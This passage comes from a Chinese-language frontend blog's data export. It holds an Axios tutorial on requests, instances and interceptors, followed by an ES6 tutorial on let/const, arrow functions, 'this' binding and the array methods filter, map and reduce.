console.log(res.data)) &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 线上环境使用安装依赖 上面是通过引入 js 文件方式，下面我们将通过安装 axios 依赖的方式直接使用 # npm 安装（axios 安装到线上环境） npm i axios -S npm i webpack webpack-cli html-webpack-plugin -D # yarn 安装 yarn add axios -S yarn add webpack webpack-cli html-webpack-plugin -D 文件及配置 根目录下新建 src/index.js 和 src/index.html 两个文件 根目录下新建 webpack.config.js 配置文件 配置 webpack const htmlWebpackPlugin = require(\"html-webpack-plugin\"); module.exports = { mode: \"development\", entry: \"./src/index.js\", plugins: [ new htmlWebpackPlugin({template: \"./src/index.html\"}) ] } 基础语法 index.js 的内容（新建了空的 index.html文件，webpack 打包后会引入这个 js ） import axios from \"axios\"; //get 的一般用法 axios.get(\"http://127.0.0.1:4523/mock/673120/getUser?id=1&amp;author=ada\") .then(res =&gt; { console.log(res); }) axios.get(\"http://127.0.0.1:4523/mock/673120/getUser\", {params: {id: 1}}) .then(res =&gt; { console.log(res); }) //post 的一般用法 axios.post(\"http://127.0.0.1:4523/mock/673120/getInfo\", \"cid=10000&amp;region=mock\") .then(res =&gt;{ console.log(res); }) 并发 axios 的并发和 Promise的同步是一样的 axios.all Promise.all 请求参数都是一个数据，返回也是一个数据 axios.spread 方法可以用参数分别接收每一个请求的结果，参数个数和发起的请求个数一致 ajax请求过多对页面性能可能会有影响，以及代码不美观，代码过于臃肿，所以我们可以使用 axios的并发请求axios.all() axios.all() 这个方法在 axios 的构造函数是没有的，没在实例对象上。 import axios from \"axios\"; axios.all([ axios.get(\"http://127.0.0.1:4523/mock/673120/getUser?id=1&amp;author=ada\"), axios.get(\"http://127.0.0.1:4523/mock/673120/getUser\", {params: {id: 1}}), axios.post(\"http://127.0.0.1:4523/mock/673120/getInfo\", \"cid=10000&amp;region=mock\") ]) .then(res =&gt; { console.log(\"--------------------all_res--------------------\"); console.log(res); }) .catch(err =&gt; { console.log(err); }) axios.all([ axios.get(\"http://127.0.0.1:4523/mock/673120/getUser?id=1&amp;author=ada\"), axios.get(\"http://127.0.0.1:4523/mock/673120/getUser\", {params: {id: 1}}), axios.post(\"http://127.0.0.1:4523/mock/673120/getInfo\", \"cid=10000&amp;region=mock\") ]) .then(axios.spread((res1, res2, res3) =&gt; { //上面是所有返回的结果是一个数组，这里用 axios.spread 用三个参数分别接收每一个请求的结果 console.log(\"--------------------res1 res2 res3--------------------\"); console.log(res1); console.log(res2); console.log(res3); })) .catch(err =&gt; console.log(err)) 全局环境配置 axios.defaults 可配置全局环境，这里简单提取两个baseURL timeout 还有很多可扩展 axios.default.headers.post[‘content-type’]=’application/x-www-form-urlencoded’; 整理数据 # 整理数据 axios.defaults.transformRequest = function (data) { data = JSON.stringify(data); return data; }; axios.defaults.baseURL = \"http://127.0.0.1:4523/mock/673120\"; axios.defaults.timeout = 5000; axios.get(\"getUser?id=123&amp;author=ada\") .then(res =&gt; { console.log(res); }) axios.post(\"getInfo\", \"cid=10000&amp;region=mock\") .then(res =&gt; { console.log(res) }) .catch(err =&gt; { console.log(err); }); 实例封装简介 有时候后台接口地址有多个并且超时时长不一样，我们不可能在axios中把每个后台请求的域名地址都拼接在URl中，并且在axios中的config写不同的超时时长，很繁琐，这个时候可以用到axios实例，在实例中可以配置这两种参数。 如果新建了一个axios实例但是没有参数，取得就是全局的配置值，实例中如果有则优先取实例中的 axios实例的相关配置（config参数） baseURL：请求的域名基本地址（如：http://localhost:8080） timeout：后端定义的超时时长（默认是1000ms） url：请求的路径（如：/data.json） method：请求方法（get、post…..） headers：设置请求头 params：请求的参数拼接在url中 data：请求的参数放在request body中 创建实例 如果同时定义了 axios.defaults 和实例中定义了同样的优先会用实例自己的 如果实例中没有定义会使用 axios.defaults 的 点击显/隐代码块 let user = axios.create({ baseURL: \"http://127.0.0.1:4523/mock/673120\", timeout: 2000, }); let getUser = axios.create({ baseURL: \"http://127.0.0.1:4523/mock/673120/getUser\", timeout: 2000, method: \"get\", }); let info = axios.create({ baseURL: \"http://127.0.0.1:4523/mock/673120\", timeout: 3000, }) user.get(\"getUser?id=111&amp;author=ada\") .then(res =&gt; { console.log(res) }) info.post(\"getInfo\", \"cid=10000&amp;region=mock\") .then(res =&gt; { console.log(res) }) getUser({ params: {id: 123, author: \"阿达\"} }) .then(res =&gt; { console.log(res); }) 拦截器示例 拦截器分为请求拦截器 和响应拦截器 实际用途：①请求拦截器：比如为每个请求都带上的参数，比如token，时间戳等 ②响应拦截器：比如对返回的状态进行判断，如token是否过期 拦截器可以为整个 axios 设置，也可以针对具体的某个实例进行设置 在使用拦截器的时候 响应拦截器可以进行设置只放行状态为 200 的，并且只放行 data（我们只return data数据） 点击显/隐代码块 import axios from \"axios\"; let getUser = axios.create({ baseURL: \"http://127.0.0.1:4523/mock/673120/getUser\", timeout: 2000, method: \"get\", }); let info = axios.create({ baseURL: \"http://127.0.0.1:4523/mock/673120\", timeout: 3000, }) info.interceptors.request.use(config =&gt; { console.log(\"info 请求拦截的配置和操作比如添加 token onFulfilled 状态\"); return config; // 一定要加这个 放行 不然就截住了请求 }, err =&gt; { console.log(\"info 请求拦截失败了会走下面这个代码块 onRejected 状态\"); }) info.post(\"getInfo\", \"cid=10000&amp;region=mock\") .then(res =&gt; { console.log(res) }) getUser.interceptors.response.use(config =&gt; { console.log(\"getUser onFulfilled 状态 响应拦截的配置和操作比如只放行状态码为 200 的 \"); // 返回时也一定要放行，而且可以只放行 data 下的内容（这个里面才是接口返回的数据），不然就截住了返回的数据了 前端就拿到接口返回的数据 return config.data; }, err =&gt; { console.log(\"getUser 响应拦截失败了会走下面这个代码块 onRejected 状态\"); }) getUser({ params: {id: 123, author: \"阿达\"} }) .then(res =&gt; { console.log(res); }) 扩展 一些常用的配置 添加 token 和返回状态的设置（全局 axios 有效） 点击显/隐代码块 // 请求拦截器 axios.interceptors.request.use( config =&gt; { // 每次发送请求之前判断是否存在token // 如果存在，则统一在http请求的header都加上token，这样后台根据token判断你的登录情况 // 即使本地存在token，也有可能token是过期的，所以在响应拦截器中要对返回状态进行判断 const token = window.localStorage.getItem(\"token\"); token &amp;&amp; (config.headers.Authorization = token); return config; }, error =&gt; { return Promise.error(error); } ); axios.interceptors.response.use( response =&gt; { // 如果返回的状态码为200，说明接口请求成功，可以正常拿到数据 // 否则的话抛出错误 if (response.status === 200) { return Promise.resolve(response); } else { return Promise.reject(response); } }, // 服务器状态码不是2开头的的情况 // 这里可以跟你们的后台开发人员协商好统一的错误状态码 // 然后根据返回的状态码进行一些操作，例如登录过期提示，错误提示等等 // 下面列举几个常见的操作，其他需求可自行扩展 error =&gt; { if (error.response.status) { return Promise.reject(error.response); } } );","categories":[{"name":"Auto","slug":"Auto","permalink":"https://www.adalucky.com/categories/Auto/"}],"tags":[{"name":"Axios","slug":"Axios","permalink":"https://www.adalucky.com/tags/Axios/"},{"name":"前端基础","slug":"前端基础","permalink":"https://www.adalucky.com/tags/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80/"}],"author":"Ada"},{"title":"ECMAScript 6","slug":"Auto/ES6","date":"2022-02-24T13:23:00.000Z","updated":"2022-06-13T14:43:37.102Z","comments":true,"path":"/auto/es6/","link":"","permalink":"https://www.adalucky.com/auto/es6/","excerpt":"ECMAScript 6.0，简称ES6，是JavaScript语言的下一代标准，已经在2015年6月正式发布。其目标为使JavaScript可以用来编写复杂的大型应用程序，成为企业级开发语言。","text":"ECMAScript 6.0，简称ES6，是JavaScript语言的下一代标准，已经在2015年6月正式发布。其目标为使JavaScript可以用来编写复杂的大型应用程序，成为企业级开发语言。 参考资料 ECMAScript 6语法和应用 ECMAScript 2015 花费6年时间敲定,是一个很大的发行版 认识ES6 函数的参数 ES6兼容性解决 解构赋值 let和 const Classl的用法 箭头函数 JSON的新应用 数组的新增方法 Module模块 Map数据结构 ES7-ES11的一些新特性介绍 字符串和新增方法和模版字符串 ECMAScript和 JavaScrip的关系 ECMA是“European Computer Manufacturers Association”的缩写,中文称欧洲计算机制造联合会。这个组织的目标是评估,开发和认可电信和计算机标准。 ECMA是标准, JavaScript是实现 类似HTML5是标准,IE10、 Chrome、FF都是实现 目的是让所有前端脚本都实现ECMA 目前只有 JavaScript实现ECMA标准, ECMAScript≈Js ECMAScript简称ECMA或ES(ES6) 目前版本 高级浏览器支持ES6 低级浏览器主要支持ES3.1 版本记录 时间 版本 说明 1996 年 11月 JavaScript 的创造者 Netscape 公司将 JavaScript 提交给标准化组织 ECMA。 1997年 ES1 ECMA 发布 262 号标准文件（ECMA-262），规定了浏览器脚本语言的标准，并将这种语言称为 ECMAScript (ES). 1998年 ES2 内容编辑加工，没有特性修改。 1999年 ES3 有较完善的修改，成为JavaScript的通行标准，得到了广泛支持。 2000年 ES4 2008年终止也称作JavaScript 2，因改动太大没有通过，Harmony项目启动来跟进，ES4大部分内容被 ES6 继承. Harmony部分内容放到ES6之后。 2009年 ES5(ES3.1) 新功能主要包括：JSON对象（包含parse/stringify等方法）、Array和Object增加一些方法，严格模式（use strict），函数的bind方法。 2011年 ES5.1 成为 ISO 国际标准（ISO/IEC 16262:2011)， 到了2012年底，主流浏览器都支持ECMAScript 5.1的全部功能 2015年 ES2015(ES6) 做了大量的更新，但向后兼容。ES6是一次重大改进。 部分功能：let/const、变量的解构赋值、Promise、箭头函数… 2016年 ES2016(ES7) 新功能主要包括： 1. Array.prototype.includes检查数组中是否存在值；（区别ES6字符串的includes方法） 2. Exponentiation Operator 求幂运算 (a ** b等价于Math.pow(a,b)) 2017年 ES2017(ES8) 部分功能： 1.Object.values/entries/getOwnPropertyDescriptors 2.String.prototype.padStart/padEnd 3.函数参数列表和调用中的尾逗号（Trailing commas） 4.Async Functions 异步函数（async/await） 2018年 ES2018(ES9) 现在已经可用了。新增异步迭代、Promise.finally()、Rest/Spread 属性、正则表达式命名捕获组、正则表达式反向断言、非转义序列的模板字符串…… let&amp;const简介 为什么ES6新增 let 关键字声明变量：因为最起初 JavaScript 设计是写一写小的项目，当时没有考虑的很全面，后面使用的人多了，var 声明变量就暴露了它的缺陷 缺陷var可以重复声明&lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; &lt;!-- 重复声明--&gt; var a = 10; var a = 20; a = 35; console.log(a) &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; var无法限制修改 var无法限制修改 var没有块级作用域{} if(){块内} for(){块内} &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; { var a = 18; console.log(a); } console.log(a); //这里没有限制代码块中变量 a 的作用域，其实是希望这里没办法使用到变量 a var name = \"ada\"; if (true) { var name = \"阿达\"; console.log(name); } console.log(name); //这里在 if 块内的赋值修改了 if 块外的 name 变量，期望的是 if 块内打印的是【阿达】，块外打印的是 【ada】 没有限制修改 &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 变量提升 let 不支持变量提升 var 不管放在哪里定义 都会把 var 语句提升到最前面 点击显/隐代码块(var变量提升) &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; &lt;!-- var 支持变量提升--&gt; a = 10; console.log(a); var a; &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 点击显/隐代码块(let不支持变量提升) &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; &lt;!-- let 不支持变量提升--&gt; a = 10; console.log(a); let a; &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 解决方法（闭包&amp;let） ES6 以前的解决方法是通过闭包的方式解决 var 在块级中没有作用域但是在方法中有作用域 示例一 需求：块内输出块内自己的变量值，块外输出块外的变量值 &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; var name = \"ada\"; if (true) { (function (nameStr) { var name = nameStr; console.log(\"闭包中的输出：\" + name); })(\"阿达\"); // 括号中的值是方法中 nameStr 传递的参数 } console.log(\"变量 var 的输出\" + name); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 示例二 需求：有 5 个按钮，每次点击打印对应的按钮序号 点击显/隐代码块(var_before) &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;button&gt;按钮一&lt;/button&gt; &lt;button&gt;按钮二&lt;/button&gt; &lt;button&gt;按钮三&lt;/button&gt; &lt;button&gt;按钮四&lt;/button&gt; &lt;button&gt;按钮五&lt;/button&gt; &lt;script&gt; //按钮添加监听事件 var btns = document.getElementsByTagName(\"button\"); for (var i = 0; i &lt; btns.length; i++) { btns[i].addEventListener(\"click\", function () { console.log(i); }); } &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 点击显/隐代码块(var_after闭包) &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;button&gt;按钮一&lt;/button&gt; &lt;button&gt;按钮二&lt;/button&gt; &lt;button&gt;按钮三&lt;/button&gt; &lt;button&gt;按钮四&lt;/button&gt; &lt;button&gt;按钮五&lt;/button&gt; &lt;script&gt; //按钮添加监听事件 var btns = document.getElementsByTagName(\"button\"); for (var i = 0; i &lt; btns.length; i++) { (function (i) { btns[i].addEventListener(\"click\", function () { console.log(i); }); })(i) } &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 示例三（let）点击显/隐代码块(let定义) &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;button&gt;按钮一&lt;/button&gt; &lt;button&gt;按钮二&lt;/button&gt; &lt;button&gt;按钮三&lt;/button&gt; &lt;button&gt;按钮四&lt;/button&gt; &lt;button&gt;按钮五&lt;/button&gt; &lt;script&gt; //按钮添加监听事件 let btns = document.getElementsByTagName(\"button\"); for (let i = 0; i &lt; btns.length; i++) { btns[i].addEventListener(\"click\", function () { console.log(i); }); } &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; const 限制修改（常量方式） 总结 以后都不用 var 如果变量需要修改就用 let 如果变量不希望修改就用 const 定义为常量 箭头函数定义的方法用 const 对象用 const 普通变量和数组用 let（我的个人习惯） let ES6 新增 let 和 const 命令,用来声明变量,用法类似于 var let 声明的变量,只在 let 命令所在的代码块內有效 let 命令不存在变量提升 let 命令不允许在相同作用域内,重复声明同一个变量 const let 拥有的特性 const 也拥有 const 不可以像 let 一样分步声明，例如： let a; a=10; 因为 const 的值不可改变，一旦定义了就不能修改，所以后面也不能进行赋值了 const 命令声明一个只读的常量。一旦声明,常量的值就不能改变 const 命令声明的常量不得改变值。即一旦声明就必须立即初始化。 const 命令声明的常量,只在声明所在的块级作用域内有效 const 命令声明的常量不提升,只能在声明的位置后使用 const 命令声明的常量,与let一样不可重复声明 const 命令声明的复合类型的数据(主要是对象和数组),变量指向的内存地址 const定义的基本类型不可修改,复合类型（对象，数组）也不可以修改,复合类型的属性是可以修改的 直接修改基本类型或者复合类型相当于修改栈内存中的地址是不允许的，修改复合类型对象的属性其实是修改该类型指向堆内存中的属性不受影响 //const定义的常量不可修改,对象也不可以修改,对象的属性是可以修改的 const obj ={name:'张三',age:10,sex:'男'}; obj.name='lisi'; //这个是支持的,因为修改的是对象在堆里面的值 obj={name:'李四',age:10,sex:'男'}; //不支持,因为是重新创建了一个堆的对象{name:'李四',age:10,sex:'男'}然后赋值给栈里面的obj所以不可修改(栈内存) 对比 const:不可修改（可以理解常量 java 中的 final） let:可以修改，（可以理解为变量） 箭头函数简介 ES6 允许使用“箭头”（=&gt;）定义 不需要参数或需要多个参数，就用圆括号代 代码块部分多于一条语句，就用大括号括起来，并且用return返回 箭头函数返回对象时，必须在对象外面加上括号 箭头函数使得表达更加简洁 箭头函数能够简化回调函数 箭头函数类似于 jdk8 中的 lamda 表达式 示例一（箭头函数基本使用） 基本规则：1.把 function 换成 =&gt; 2.把 =&gt; 放在参数和 {} 的中间 如果只有一个参数 = 等号和箭头中间写形参名 =&gt; 如果 { } 大括号代码块内只有一条语句不用写 return 和大括号{ } 这里是同时都不写 return 和大括号{ }一般是成对出现的，有大括号一般都有 return，如果有大括号里面哪怕只有一条语句也要加上 return 不然调用该方法的时候会出现 undefined 如果有多个参数或者没有参数也必须要用 () 来定义参数列表，没有参数的时候括号内就空着 点击显/隐代码块(箭头函数示例一) &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; function fun1(a) { return a * a; } console.log(fun1(1)); const fun2 = function (b) { return b * b; } console.log(fun2(2)); //第一次演变：1.把 function 换成 =&gt; 2.把 =&gt; 放在参数和 {} 的中间 const fun3 = (c) =&gt; { return c * c; }; console.log(fun3(3)); //第二次演变：1.如果只有一个参数 = 等号和箭头中间写形参名 =&gt; 2.如果 { } 大括号代码块内只有一条语句不用写 return 和大括号{ } const fun4 = d =&gt; d * d; console.log(fun4(4)); //第三次演变：如果有多个参数或者没有参数也必须要用 () 来定义参数列表，没有参数的时候括号内就空着 const fun5 = (e, f, g) =&gt; { let add = e + f + g; return add; } console.log(fun5(1, 2, 3)); //第四次演变：1.没有参数也要用括号 () 来定义参数列表 2.方法体内只有一条语句不用加大括号 { } 和 return 关键字 const fun6 = () =&gt; 10 * 10; console.log(fun6()); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 示例二（数组排序） 方法的演变还是和上面示例一相同，1.把 function 换成 =&gt; 2.把 =&gt; 放在参数和 {} 的中间 箭头函数的函数体只有一条语句 不用加 { } 和 return 点击显/隐代码块(箭头函数数组排序) &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; let array = [1, 3, 5, 7, 9, 15, 88, 99]; //数组升序排列 从小到大 i - j 表示从小到大 j - i 表示从大到小 const asc = array.sort(function (i, j) { return i - j; }) console.log(asc); //箭头函数数组降序序排列 从大到小 j - i 表示从大到小 const desc = array.sort((i, j) =&gt; j - i); console.log(desc); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 示例三（箭头函数返回对象） 返回的对象 obj 需要用法大括号包裹起来和箭头函数的大括号有冲突，所以可通过外面包裹一层 大括号+return 或者用小括号包括返回的对象 不能直接像上面那样只有一条语句连对象的大括号都不写，对象需要用大括号包裹的不然 IDE 工具就会报错 点击显/隐代码块(箭头函数返回对象) &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; //方式一：箭头函数返回对象时语法 { return {返回的对象内容} } 如果只写里面的对象的括号语法会以为是箭头函数的大括号 const fun1 = id =&gt; { return {id: id, name: \"阿达\"} }; console.log(fun1(10001)); console.log(fun1(10001).id); console.log(fun1(10001).name); //方式二：其实我们只有一条语句不想写 return 语句，就用小括号括住返回的对象 ( { 返回的对象 } ) const fun2 = (id, name) =&gt; ({id: id, name: name}); console.log(fun2(10002, \"adalucky\")); console.log(fun2(10002, \"adalucky\").id); console.log(fun2(10002, \"adalucky\").name); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 示例四（构造方法） 箭头函数没有构造方法，因此不能用箭头函数定义一个方法然后还去 new 这个方法 点击显/隐代码块（构造方法错误示例） &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; function demo1() { } const fun1 = new demo1(); console.log(fun1); const demo2 = () =&gt; { } const fun2 = new demo2(); // 控制台会提示 Uncaught TypeError: demo2 is not a constructor demo2不是一个构造方法，因为 dome2 是用箭头函数定义的，箭头函数没有构造方法 console.log(fun2); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 关于箭头函数中的this的指向简介 普通函数的this：指向它的调用者，如果没有调用者则默认指向window. 箭头函数的this: 指向箭头函数定义时所处的对象，而不是箭头函数使用时所在的对象，默认使用父级的this. 综上：箭头函数没有自己的this，它的this是继承而来，默认指向在定义它时所处的对象(宿主对象)。 上面三条看起很懵，没关系接着看下面的两个示例看完再回来理解这三条的含义 示例一 普通函数，谁调用这个方法，this 就代表谁，没有人调用直接运行就代表最大的 window 对象 箭头函数跟调用者无关，指向的是函数定义时所处的对象，可以理解为父级的 this 对象，如果父级没有，就再往上找，最后是到 window 对象 下图中 arrowThis2.html 的 fun1 定义在 adaThis2对象,该对象直接是在 window 里面定义的，因此上下文的 tihs 就是 window 所以无论怎么调用都会指向 window 对象 点击显/隐代码块(普通函数this指向) &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; //定义了一个对象 adaThis1 里面 代码块的形式定义了一个方法fun1 //定义的方法语法有点类似 json 格式 f:f(){} const adaThis1 = { fun1: function () { console.log(this); } }; //用 adaThis1 这个对象调用运行 fun1---&gt; // this 就会指向它的调用者 也就会是这个 adaThis1 adaThis1.fun1(); function fun2() { console.log(this); } //没有对象调用，直接用运行 fun2() 就会指向 window 对象 fun2(); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 点击显/隐代码块(箭头函数this指向) &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; //对象adaThis2 代码块箭头函数的形式定义了一个方法 fun1 //定义的方法语法有点类似 json 格式 f:f(){} const adaThis2 = { fun1: () =&gt; { console.log(this); } } //用 adaThis2 这个对象调用运行 fun1---&gt; //this 指向箭头函数定义时所处的对象，而不是箭头函数使用时所在的对象，默认使用父级的this adaThis2.fun1(); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 示例二 再次强调普通函数的 this 指向和调用者有关 下面的内容主要是针对示例一更加直观的解释 this 指向问题（普通函数） 左侧代码大致的意思是定义了一个 box，设置了css 属性，当发生点击时添加新的样式进来，右侧是把添加新样式的方法写在了 setTimeout 里面等待三秒，因为 setTimeout 是 window 的对象，所以调用者不是 box 因此无法改变颜色，通过对比来阐述普通函数 this 对象指向的是调用者 点击显/隐代码块(左侧代码) &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;style&gt; #box { height: 100px; width: 100px; background: red; } #box.newColor { background: yellow; } &lt;/style&gt; &lt;div id=\"box\"&gt;&lt;/div&gt; &lt;script&gt; const box = document.getElementById(\"box\"); box.onclick = function () { console.log(this); this.className = \"newColor\"; } &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 点击显/隐代码块(右侧代码) &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;style&gt; #box { height: 100px; width: 100px; background: red; } #box.newColor { background: yellow; } &lt;/style&gt; &lt;div id=\"box\"&gt;&lt;/div&gt; &lt;script&gt; const box = document.getElementById(\"box\"); box.onclick = function () { setTimeout(function () { console.log(this); this.className = \"newColor\"; }, 3000) } &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 示例三 本内容是对示例二中添加了 setTimeout 函数无法改变颜色获取我们期望的对象做修复 普通函数就在 setTimeout 前获取 this 对象，命名为 obj，此时的 obj 指向的是 box 对象，再用这个 obj 调用就相当于用 box 调用 普通函数 this 指向和调用者有关 箭头函数与调用者无关,指向箭头函数定义时所处的对象 点击显/隐代码块(左侧代码) &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;style&gt; #box { height: 100px; width: 100px; background: red; } #box.newColor { background: yellow; } &lt;/style&gt; &lt;div id=\"box\"&gt;&lt;/div&gt; &lt;script&gt; const box = document.getElementById(\"box\"); box.onclick = function () { //此时的 this 是 box，把 this 赋给 obj let obj = this; setTimeout(function () { console.log(this); console.log(obj); //用上面赋值的 obj 调用就相当于用 box 调用 obj.className = \"newColor\"; }, 3000) } &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 点击显/隐代码块(右侧代码) &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;style&gt; #box { height: 100px; width: 100px; background: red; } #box.newColor { background: yellow; } &lt;/style&gt; &lt;div id=\"box\"&gt;&lt;/div&gt; &lt;script&gt; const box = document.getElementById(\"box\"); box.onclick = function () { setTimeout(() =&gt; { //箭头函数 this 指向和调用者无关，指向箭头函数定义时所处的对象 console.log(this); this.className = \"newColor\"; }, 3000) } &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 数组新方法常用新增方法 filter 过滤器(过滤掉不符合条件的数据) map 映射（把数据映射到新的对象中） reduce 汇总（统计求和） some() 数组中有一个为真就返回真—&gt;待补充（判断时候用） every() 数组中有全部为真才返回真—&gt;待补充（判断时候用） 需求：有一批商品，现在要做促销活动，把价格大于等于 10 的商品打 5 折后计算此次促销会少赚多少钱 通过该需求进行 ES6 高级函数的演示 示例一 示例一中将用以前原始的写法进行实现需求 let n of array 语法可以了解一下 点击显/隐代码块 //需求：有一批商品，现在要把大于或等于 10 元的商品促销打 5 折处理 // ①过滤 &gt;=10元的商品 ②把过滤的商品打 5 折 ③列出促销产品打折前后的价格 ④计算此次促销少赚多少钱 let goods = [10, 20, 3, 30, 2, 5, 90, 100]; let step1 = []; //步骤一：定义了一个空的数组用于存放 &gt;= 10的商品价格（过滤） //let n of goods 该语法相当于会去循环 goods 数组，循环的次数就是数组的长度，n 是每次循环对应下标的值 for (let n of goods) { if (n &gt;= 10) { step1.push(n); } } console.log(step1); let step2 = []; //步骤二：定义了一个空的数组用于存放 &gt;= 10的商品价格打 5 折以后的价格（打折） for (let n of step1) { step2.push(n * 0.5) } console.log(step2); let beforeSum = 0; //定义两个数组用于存放促销商品打折前后的价格 let afterSum = 0; for (let n of step1){ beforeSum += n; //步骤三：促销产品打折前价格 } for (let n of step2){ afterSum += n; //步骤三：促销产品打折后价格 } console.log(\"促销产品原始总价：\"+beforeSum+\",促销产品打折后总价：\"+afterSum+\",少盈利：\"+(beforeSum-afterSum)); 示例二 示例二中采用 ES6 中新增的高级方法 filter map reduce 实现 点击显/隐代码块 //需求：有一批商品，现在要把大于或等于 10 元的商品促销打 5 折处理 // ①过滤 &gt;=10元的商品 ②把过滤的商品打 5 折 ③列出促销产品打折前后的价格 ④计算此次促销少赚多少钱 let goods = [10, 20, 3, 30, 2, 5, 90, 100]; let step1 = goods.filter(function (n) { //步骤一：过滤 &gt;= 10的商品价格,参数 n 为每次遍历数组 goods 后的结果，当 n &gt;=10（布尔表达式） 才返回到数组中 return n &gt;= 10; // step1 = [ 10, 20, 30, 90, 100 ] }) console.log(step1); let step2 = step1.map(function (n) { //步骤二：打折后映射到新的数组 step2 中，参数 n 为每次遍历数组 step1 后的结果,打 5 折后返回至 step2 中 return n * 0.5; //step2 = [ 5, 10, 15, 45, 50 ] }) console.log(step2); let beforeSum = step1.reduce(function (s, n) { //有两个参数 s,n s给了一个初始值就是后面的 0(不给值默认也是 0) ，n 遍历数组中的每一个对象值 //第一次：s=0,n=10(step1中第一个元素)，return 后 s=10（s+=n -&gt; s=s+n),beforeSum=10; //第二次：s=10,n=20, return 后 s=30,beforeSum=30; 第三次：s=30,n=30,return 后 s=60,beforeSum=60 return s += n; //步骤三：促销产品打折前价格 }, 0) let afterSum = step2.reduce(function (s, n) { return s += n; //步骤三：促销产品打折后价格 }, 0) console.log(\"促销产品原始总价：\" + beforeSum + \",促销产品打折后总价：\" + afterSum + \",少盈利：\" + (beforeSum - afterSum)); 示例三 在示例二的基础上进行链式编程方式，更加优雅的实现 点击显/隐代码块 //需求：有一批商品，现在要把大于或等于 10 元的商品促销打 5 折处理 // ①过滤 &gt;=10元的商品 ②把过滤的商品打 5 折 ③列出促销产品打折前后的价格 ④计算此次促销少赚多少钱 let goods = [10, 20, 3, 30, 2, 5, 90, 100]; 